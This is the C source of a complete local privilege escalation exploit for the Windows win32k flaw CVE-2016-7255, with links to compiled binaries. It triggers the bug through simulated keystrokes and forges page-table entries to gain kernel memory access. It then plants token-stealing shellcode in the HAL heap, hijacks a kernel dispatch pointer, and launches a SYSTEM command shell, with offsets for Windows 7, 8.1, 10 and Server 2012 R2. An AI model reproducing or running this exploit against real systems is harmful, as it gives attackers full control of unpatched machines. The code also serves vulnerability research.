/*
Source: https://ricklarabee.blogspot.com/2017/01/virtual-memory-page-tables-and-one-bit.html

Binary: https://github.com/rlarabee/exploits/raw/8b9eb646516d7f022a010f28018209f331c28975/cve-2016-7255/compiled/cve-2016-7255.exe
Mirror: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41015.exe
*/

// ricklarabee.blogspot.com

//This program is free software; you can redistribute it and/or
//modify it under the terms of the GNU General Public License
//as published by the Free Software Foundation.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program; if not, write to the Free Software
//Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

// Credits: enrique.nissim@IOActive.com: https://github.com/IOActive/I-know-where-your-page-lives/tree/master/code/CVE-2016-7255
// PoC from https://github.com/tinysec/public/tree/master/CVE-2016-7255

#include <windows.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib, "advapi32")

UINT64 PML4_BASE;
UINT PML4_SELF_REF_INDEX;
UINT64 PML4_SELF_REF = 0xFFFFF6FB7DBEDF68;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define GET_INDEX(va)  ( ((va >> 39) & 0x1ff )) 

////////////////////////////////////////////////////////
// Define Data Types
////////////////////////////////////////////////////////
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    PVOID  Unknown1;
    PVOID  Unknown2;
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS { 
    SystemModuleInformation = 11,
    SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                                        OUT PVOID                   SystemInformation,
                                                        IN ULONG                    SystemInformationLength,
                                                        OUT PULONG ReturnLength);

typedef NTSTATUS (WINAPI *NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
													OUT PULONG Interval);

NtQuerySystemInformation_t NtQuerySystemInformation;
NtQueryIntervalProfile_t NtQueryIntervalProfile;
                  
char shellcode[] = {
	//0xcc,
	0xfa, 															// CLI
	0x9c, 															// PUSHFQ
	0x48, 0xb8, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RAX, Original Pointer
	0x50, 															// PUSH RAX
	0x51, 															// PUSH RCX
	0x48, 0xb9, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RCX, [OverwriteAddr+OverwriteOffset]
	0x48, 0x89, 0x01,  												// MOV    QWORD PTR [RCX], RAX
	0xb9, 0x90, 0x90, 0x90, 0x90,  									// MOV ECX, PID
	0x53, 															// PUSH RBX

	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  			// MOV    RAX,QWORD PTR gs:0x188
	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,						// MOV    RAX,QWORD PTR [RAX+0xb8] EPROCESS
	0x48, 0x8d, 0x80, 0x90, 0x90, 0x00, 0x00,						// LEA    RAX,[RAX+0xActiveProcessLinkOffset] 
	//<tag>
	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-0x8] // UniqueProcessID
	0x48, 0x83, 0xfb, 0x04,											// CMP    RBX,0x4
	0x75, 0xf3,														// JNE    <tag>
	0x48, 0x8b, 0x98, 0x90, 0x90, 0x90, 0x90,						// MOV    RBX, QWORD PTR [RAX+0x60] // GET TOKEN of SYSTEM

	0x53, 															// PUSH RBX
	//<tag2>
	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-0x8] // UniqueProcessID
	0x39, 0xcb,														// CMP    EBX, ECX // our PID
	0x75, 0xf5,														// JNE    <tag2>
	0x5b, 															// POP RBX
	0x48, 0x89, 0x98, 0x90, 0x90, 0x90, 0x90,						// MOV    QWORD PTR[RAX + 0x60], RBX

	0x5b, // POP RBX
	0x59, // POP RCX
	0x58, // POP RAX
	0x9d, // POPFQ

	0xfb, // STI
	0xff, 0xe0 // JMP RAX
};

ULONG __cdecl DbgPrint(__in char* Format, ...)
{
	CHAR* pszDbgBuff = NULL;
	va_list VaList = NULL;
	ULONG ulRet = 0;

	do
	{
		pszDbgBuff = (CHAR*)HeapAlloc(GetProcessHeap(), 0, 1024 * sizeof(CHAR));
		if (NULL == pszDbgBuff)
		{
			break;
		}
		RtlZeroMemory(pszDbgBuff, 1024 * sizeof(CHAR));

		va_start(VaList, Format);

		_vsnprintf((CHAR*)pszDbgBuff, 1024 - 1, Format, VaList);


		OutputDebugStringA(pszDbgBuff);

		va_end(VaList);

	} while (FALSE);

	if (NULL != pszDbgBuff)
	{
		HeapFree(GetProcessHeap(), 0, pszDbgBuff);
		pszDbgBuff = NULL;
	}

	return ulRet;
}


int _sim_key_down(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = 0;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_key_up(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = KEYEVENTF_KEYUP;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_alt_shift_esc()
{
	int i = 0;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);


	} while (FALSE);

	return 0;
}



int _sim_alt_shift_tab(int nCount)
{
	int i = 0;
	HWND hWnd = NULL;


	int nFinalRet = -1;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		for (i = 0; i < nCount; i++)
		{
			_sim_key_down(VK_TAB);
			_sim_key_up(VK_TAB);

			Sleep(1000);

		}


		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);
	} while (FALSE);

	return nFinalRet;
}

int _sim_alt_esc(int count)
{
	int i = 0;

	for (i = 0; i<count; i++)
	{
		_sim_key_down(VK_MENU);
		//_sim_key_down(VK_SHIFT);


		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_up(VK_MENU);
		//_sim_key_up(VK_SHIFT);

	}

	return 0;
}


int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = { 0 };

	HWND    hWndParent = NULL;
	HWND    hWndChild = NULL;

	WCHAR*  pszClassName = L"cve-2016-7255";
	WCHAR*  pszTitleName = L"cve-2016-7255";

	void*   pId = NULL;
	MSG     stMsg = { 0 };

	UINT64 value = 0;

	do
	{

		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;

		if (0 == RegisterClassExW(&stWC))
		{
			break;
		}

		hWndParent = CreateWindowExW(
			0,
			pszClassName,
			NULL,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE,
			0,
			0,
			360,
			360,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD,
			0,
			0,
			160,
			160,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndChild)
		{
			break;
		}

#ifdef _WIN64
		pId = ((UCHAR*)pAddress - 0x28);
#else
		pId = ((UCHAR*)pAddress - 0x14);
#endif // #ifdef _WIN64

		SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)pId);

		DbgPrint("hWndChild = 0x%p\n", hWndChild);

		ShowWindow(hWndParent, SW_SHOWNORMAL);

		SetParent(hWndChild, GetDesktopWindow());

		SetForegroundWindow(hWndChild);

		_sim_alt_shift_tab(4);

		SwitchToThisWindow(hWndChild, TRUE);

		_sim_alt_shift_esc();

		while (GetMessage(&stMsg, NULL, 0, 0)) {
			
			SetFocus(hWndParent);
			_sim_alt_esc(20);
			SetFocus(hWndChild);
			_sim_alt_esc(20);

			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);
			
			if (value != 0) {
				break;
			}
			

			__try {
				value = *(UINT64 *)PML4_SELF_REF;
				if ((value & 0x67) == 0x67) {
					printf("Value Self Ref = %llx\n", value);
					break;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				continue;
			}

		}


	} while (FALSE);

	if (NULL != hWndParent)
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if (NULL != hWndChild)
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName, GetModuleHandleW(NULL));

	return 0;
}

UINT64 get_pxe_address(UINT64 address) {
	UINT entry = PML4_SELF_REF_INDEX;
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}

UINT64 look_free_entry_pml4(void) {
	// Looks for a free pml4e in the last 0x100 bytes of the PML4
	int offset = 0xF00;
	UINT64 pml4_search = PML4_BASE + offset;
	while (offset < 0xFF8)
	{
		if ((*(PVOID *)pml4_search) == 0x0)
		{
			// This is a NULL (free) entry
			break;
		}
		offset += 8;
		pml4_search = PML4_BASE + offset;
	}
	return pml4_search;
}

UINT64 calculate_spurious_pt_address(UINT64 spurious_offset) {
	UINT64 index = (spurious_offset & 0xFFF) / 8;
	UINT64 result = (
		((UINT64)0xFFFF << 48) |
		((UINT64)PML4_SELF_REF_INDEX << 39) |
		((UINT64)PML4_SELF_REF_INDEX << 30) |
		((UINT64)PML4_SELF_REF_INDEX << 21) |
		(index << 12)
		);
	return result;
}



UINT64 create_spurious_pte_to_virtual_address(UINT64 virtual_address, BOOL patch_original) {

	/*
	1: kd> !pte ffffffff`ffd00000
	VA ffffffffffd00000
	PXE at FFFFF6FB7DBEDFF8    PPE at FFFFF6FB7DBFFFF8    PDE at FFFFF6FB7FFFFFF0    PTE at FFFFF6FFFFFFE800
	contains 0000000000A1F063  contains 0000000000A20063  contains 0000000000A25063  contains 8000000000103963
	pfn a1f-- - DA--KWEV  pfn a20-- - DA--KWEV  pfn a25-- - DA--KWEV  pfn 103 - G - DA--KW - V
	*/	

	UINT64 pte = get_pxe_address(virtual_address);
	int pte_offset = pte & 0xFFF;
	//printf("PTE: %llx, %x\n", pte, pte_offset);
	
	UINT64 pde = get_pxe_address(pte);
	int pde_offset = pde & 0xFFF;
	//printf("PDE: %llx, %x\n", pde, pde_offset);
		
	UINT64 pdpte = get_pxe_address(pde);
	int pdpte_offset = pdpte & 0xFFF;
	//printf("PDPTE: %llx,%x\n", pdpte, pdpte_offset);
		
	UINT64 pml4e = get_pxe_address(pdpte);
	int pml4e_offset = pml4e & 0xFFF;
	//printf("PML4E: %llx\n", pml4e, pml4e_offset);
	
	UINT64 spurious_offset = look_free_entry_pml4();
	printf("[+] Selected spurious PML4E: %llx\n", spurious_offset);
	UINT64 f_e_pml4 = spurious_offset;
	UINT64 spurious_pt = calculate_spurious_pt_address(spurious_offset);
	printf("[+] Spurious PT: %llx\n", spurious_pt);
	printf("--------------------------------------------------\n\n");
	
	
	//Read the physical address of pml4e	
	UINT64 pml4e_pfn = (UINT64)(*(PVOID *)pml4e);
	printf("[+] Content pml4e %llx: %llx\n", pml4e, pml4e_pfn);
	// Change the PxE
	pml4e_pfn = pml4e_pfn | 0x67; // Set U/S
	
	printf("[+] Patching the Spurious Offset (PML4e) %llx: %llx\n",f_e_pml4, pml4e_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pml4e_pfn;
	Sleep(0x1); // Sleep for TLB refresh;
	
	//Read the physical address of pdpte
	UINT64 pdpte_pfn = (UINT64) *(PVOID *)(spurious_pt + pdpte_offset);
	printf("[+] Content pdpte %llx: %llx\n", pdpte, pdpte_pfn);
	// Change the PxE
	pdpte_pfn = pdpte_pfn | 0x67; // Set U/S
	printf("[+] Patching the Spurious Offset (PDPTE) %llx: %llx\n", spurious_offset, pdpte_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pdpte_pfn;
	Sleep(0x1); // Sleep for TLB refresh;
	
	//Read the physical address of pde
	UINT64 pde_addr = spurious_pt + pde_offset;
	UINT64 pde_pfn = (UINT64) *(PVOID *)(spurious_pt + pde_offset);
	printf("[+] Content pdpe %llx: %llx\n", pde, pde_pfn);
	// Change the PxE
	pde_pfn = pde_pfn | 0x67; // Set U/S
	printf("[+] Patching the Spurious Offset (PDE) %llx: %llx\n", spurious_offset, pde_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pde_pfn;
	Sleep(0x1); // Sleep for TLB refresh;
	
	//Read the physical address of pte
	UINT64 pte_addr = spurious_pt + pte_offset;
	UINT64 pte_pfn = (UINT64) *(PVOID *)(spurious_pt + pte_offset);
	printf("[+] Content pte %llx: %llx\n", pte, pte_pfn);
	// Change the PxE
	pte_pfn = pte_pfn | 0x67; // Set U/S
    pte_pfn = pte_pfn & 0x7fffffffffffffff; // Turn off NX   
	if (patch_original) {
		printf("*** Patching the original location to enable NX...\n");
		*(PVOID *)(spurious_pt + pte_offset) = (PVOID)pte_pfn;
	}
 
	printf("[+] Patching the Spurious Offset (PTE) %llx: %llx\n", spurious_offset, pte_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pte_pfn;
	Sleep(0x1); // Sleep for TLB refresh;
	printf("\n\n");
	return spurious_pt;
}

UINT64 get_OverwriteAddress_pointer(UINT64 target_address, int target_offset) {
	printf("[*] Getting Overwrite pointer: %llx\n", target_address);
	UINT64 OverwriteAddress = create_spurious_pte_to_virtual_address(target_address, FALSE);
	OverwriteAddress += (target_address & 0xFFF);
	printf("OverwriteAddress: %llx\n", OverwriteAddress);
	return (UINT64) *((PVOID *)(((char *)OverwriteAddress) + target_offset));
}

void overwrite_TargetAddress(UINT64 hook_address, UINT64 target_address, int target_offset) {
	UINT64 OverwriteTarget = create_spurious_pte_to_virtual_address(target_address, FALSE);
	OverwriteTarget += (target_address & 0xFFF);
	UINT64 target = (UINT64)((char *)OverwriteTarget) + target_offset;
	printf("Patch OverwriteTarget: %llx with %llx\n", target, hook_address);
	*(PVOID *)target = (PVOID)hook_address;
}


UINT64 store_shellcode_in_hal(void) {
	//// Finally store the shellcode on the HAL

	UINT64 hal_heap_addr = 0xFFFFFFFFFFD00000;
	UINT64 hal_heap = create_spurious_pte_to_virtual_address(hal_heap_addr, TRUE);

	printf("HAL address: %llx\n", hal_heap);
	// 0xffffffffffd00d50 this is a good offset to store shellcode 
	// 0xfff - 0xd50 = 0x2af space

	memcpy(((char *)hal_heap) + 0xd50, shellcode, sizeof(shellcode));
	return 0xffffffffffd00d50;
}

UINT64 GetHalDispatchTable() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    UINT64 HalDispatchTable;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    hNtDll = LoadLibrary("ntdll.dll");

    if (!hNtDll) {
        printf("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        printf("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);

    if (!pSystemModuleInformation) {
        printf("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);

    if (NtStatus != STATUS_SUCCESS) {
        printf("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    printf("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
    printf("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
    
    hKernelInUserMode = LoadLibraryA(KernelImage);

    if (!hKernelInUserMode) {
        printf("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // This is still in user mode
    HalDispatchTable = (UINT64)GetProcAddress(hKernelInUserMode, "HalDispatchTable");

    if (!HalDispatchTable) {
        printf("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        HalDispatchTable = (ULONGLONG)HalDispatchTable - (ULONGLONG)hKernelInUserMode;

        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = ((ULONGLONG)HalDispatchTable + (ULONGLONG)KernelBaseAddressInKernelMode);
        printf("\t\t\t[+] HalDispatchTable: 0x%llx\n", HalDispatchTable);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;

    return HalDispatchTable;
}

int __cdecl main(int argc, char** argv)
{
	TCHAR pre_username[256];
	TCHAR post_username[256];
	DWORD size = 256;
	ULONG Interval = 0;
	HMODULE hNtDll = NULL;
	UINT retval;
    UINT64 overwrite_address;
    int overwrite_offset;
    
    // define operating system version specific variables
    unsigned char sc_KPROCESS;
    unsigned int sc_TOKEN;
    unsigned int sc_APLINKS;
	int osversion;

	if (argc != 2) {
		printf("Please enter an OS version\n");
		printf("The following OS'es are supported:\n");
		printf("\t[*] 7  - Windows 7\n");
		printf("\t[*] 81 - Windows 8.1\n");
		printf("\t[*] 10 - Windows 10 prior to build release 14393 (Anniversary Update)\n");
		printf("\t[*] 12 - Windows 2012 R2\n");
		printf("\n");
		printf("\t[*] For example:  cve-2016-7255.exe 7    -- for Windows 7\n");
		return -1;
	}
	
	osversion = _strtoui64(argv[1], NULL, 10);
	
    if(osversion == 7) 
    {
        // the target machine's OS is Windows 7 SP1
        printf("   [+] Windows 7 SP1\n");
        sc_KPROCESS = 0x70;			// dt -r1 nt!_KTHREAD  +0x050 ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x80;			// dt -r1 nt!_EPROCESS [+0x208 Token : _EX_FAST_REF] - [+0x188 ActiveProcessLinks : _LIST_ENTRY] = (0x80)
        sc_APLINKS  = 0x188;		// dt -r1 nt!_EPROCESS +0x188 ActiveProcessLinks : _LIST_ENTRY
        
        overwrite_address = GetHalDispatchTable();  // HalDispatchTable
        overwrite_offset = 0x8;      				// QueryIntervalProfile        
    }
	else if(osversion == 81)
    {
        // the target machine's OS is Windows 8.1
        printf("   [+] Windows 8.1\n");
        sc_KPROCESS = 0xB8;             // dt -r1 nt!_KTHREAD +0x098 ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x60;             // dt -r1 nt!_EPROCESS [+0x348 Token : _EX_FAST_REF] - [+0x2e8 ActiveProcessLinks : _LIST_ENTRY] = (0x60)
        sc_APLINKS  = 0x2e8;         	// dt -r1 nt!_EPROCESS +0x2e8 ActiveProcessLinks : _LIST_ENTRY
        
        overwrite_address = 0xffffffffffd00510;     // HalpInterruptController_address (dq poi(hal!HalpInterruptController))
        overwrite_offset = 0x78;                    // HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
	else if(osversion == 10)
    {
        // the target machine's OS is Windows 10 prior to build 14393
        printf("   [+] Windows 10\n");
        sc_KPROCESS = 0xB8;             // dt -r1 nt!_KTHREAD +0x098 ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x68;             // dt -r1 nt!_EPROCESS [+0x358 Token : _EX_FAST_REF] - [+0x2f0 ActiveProcessLinks : _LIST_ENTRY] = (0x60)
        sc_APLINKS  = 0x2f0;            // dt -r1 nt!_EPROCESS +0x2f0 ActiveProcessLinks : _LIST_ENTRY
        
        overwrite_address = 0xffffffffffd004c0;     // HalpInterruptController_address (dq poi(hal!HalpInterruptController)
        overwrite_offset = 0x78;                    // HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
	else if(osversion == 12)
    {
        // the target machine's OS is Windows 2012 R2
        printf("   [+] Windows 2012 R2\n");
        sc_KPROCESS = 0xB8;             // dt -r1 nt!_KTHREAD +0x098 ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x60;             // dt -r1 nt!_EPROCESS [+0x348 Token : _EX_FAST_REF] - [+0x2e8 ActiveProcessLinks : _LIST_ENTRY] = (0x60)
        sc_APLINKS  = 0x2e8;            // dt -r1 nt!_EPROCESS +0x2e8 ActiveProcessLinks : _LIST_ENTRY
        
        overwrite_address = 0xffffffffffd12c70;     // HalpInterruptController_address (dq poi(hal!HalpInterruptController)
        overwrite_offset = 0x78;                    // HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
    // in case the OS version is not any of the previously checked versions
    else
    {
        printf("   [-] Unsupported version\n");
        printf("      [*] Affected 64-bit operating systems\n");
        printf("         [*] Windows 7 SP1                 -- cve-2016-7255.exe 7\n");
		printf("         [*] Windows 8.1                   -- cve-2016-7255.exe 81\n");
		printf("         [*] Windows 10 before build 14393 -- cve-2016-7255.exe 10\n");
		printf("		 [*] Windows 2012 R2			   -- cve-2016-7255.exe 12\n");
        return -1;
    }
        
	printf("My PID is: %d\n", GetCurrentProcessId());
    GetUserName(pre_username, &size);
	printf("Current Username: %s\n", pre_username);
	printf("PML4 Self Ref: %llx\n", PML4_SELF_REF);
    printf("Shellcode stored at: %p\n", (void *) &shellcode);
	printf("Enter to continue...\n");
	getchar();

	do
	{
		or_address_value_4((void*)PML4_SELF_REF);
	} while (FALSE);

	PML4_SELF_REF_INDEX = GET_INDEX((UINT64)PML4_SELF_REF);
	printf("[*] Self Ref Index: %x\n", PML4_SELF_REF_INDEX);
	PML4_BASE = ((UINT64)PML4_SELF_REF & (UINT64)0xFFFFFFFFFFFFF000);
	
    UINT64 original_pointer = get_OverwriteAddress_pointer(overwrite_address, overwrite_offset);

	printf("Original OverwriteTarget pointer: %llx\n", original_pointer);
	DWORD pid = GetCurrentProcessId();
  
    /* Shellcode Patching !! */
	char *p = shellcode;
	p += 4; // skip the CLI, PUSHF and MOV RAX bytes	
	*(PVOID *)p = (PVOID)original_pointer; // Patch shellcode1

	p += 12; // Patch shellcode with original value in the Overwrite address
	*(PVOID *)p = (PVOID)(overwrite_address + overwrite_offset);

	p += 12; // To patch the PID of our process
	
	*(DWORD *)p = (DWORD)pid;
    
    p += 17;
    *(unsigned char *)p = (unsigned char)sc_KPROCESS;
    
    p += 7;
    *(unsigned int *)p = (unsigned int)sc_APLINKS;
    
    p += 20;
    *(unsigned int *)p = (unsigned int)sc_TOKEN;
    
    p += 20;
    *(unsigned int *)p = (unsigned int)sc_TOKEN;
    
    UINT64 shellcode_va = store_shellcode_in_hal();
	printf("[+] w00t: Shellcode stored at: %llx\n", shellcode_va);
	overwrite_TargetAddress(shellcode_va, overwrite_address, overwrite_offset);
	
	if (osversion == 7){
		// Exploit Win7.1
		hNtDll = LoadLibrary("ntdll.dll");

		if (!hNtDll) {
			printf("\t\t[-] Failed loading NtDll: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	
		NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");

		if (!NtQueryIntervalProfile) {
			printf("\t\t[-] Failed Resolving NtQueryIntervalProfile: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}	
		NtQueryIntervalProfile(0x1337, &Interval);
	}

	
	while (1) {
		size = 256;
		GetUserName(post_username, &size);
		if (memcmp(post_username, pre_username, 256) != 0) break;
	}
	Sleep(2000);
	system("cmd.exe");


	return 0;
}